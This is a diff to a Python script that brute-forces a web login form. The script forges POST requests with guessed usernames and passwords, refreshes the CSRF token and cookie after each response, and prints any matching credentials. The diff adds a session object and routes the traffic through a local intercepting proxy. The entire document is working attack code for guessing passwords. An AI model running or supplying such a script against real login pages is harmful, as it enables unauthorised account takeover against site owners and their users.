@@ -28,7 +28,7 @@ PASS_FILE = sys.argv[3]
 #INIT_TOKEN = sys.argv[4]
 #INIT_COOKIE = sys.argv[5]
 
-def forge_post(url, token, cookie, username, password):
+def forge_post(url, token, cookie, username, password, session):
 
     #Template
     '''
@@ -72,7 +72,7 @@ def forge_post(url, token, cookie, username, password):
     }
 
 
-    resp = requests.post(url, headers = headers, data=payload, cookies=cookie)
+    resp = session.post(url, headers = headers, data=payload, cookies=cookie)
 
     return resp
 
@@ -114,8 +114,12 @@ def analyze_resp(resp):
 
 def main():
 
+    #init session
+    actual_session = requests.Session()
+    actual_session.proxies = {'http' : 'localhost:8080', 'https' : 'localhost:8080'}
+
     #initial GET request
-    resp = requests.get(URL)
+    resp = actual_session.get(URL)
     (cookie, token, password_correct) = analyze_resp(resp)
 
     with open(USER_FILE,"r") as u:
@@ -126,7 +130,7 @@ def main():
                 password_correct = False
 
                 for password in f.readlines():
-                    resp = forge_post(URL, token, cookie, user, password)
+                    resp = forge_post(URL, token, cookie, user, password, actual_session)
                     (cookie, token, password_correct) = analyze_resp(resp)
                     if password_correct:
                         print(f"[+] Password match! {user}:{password}")
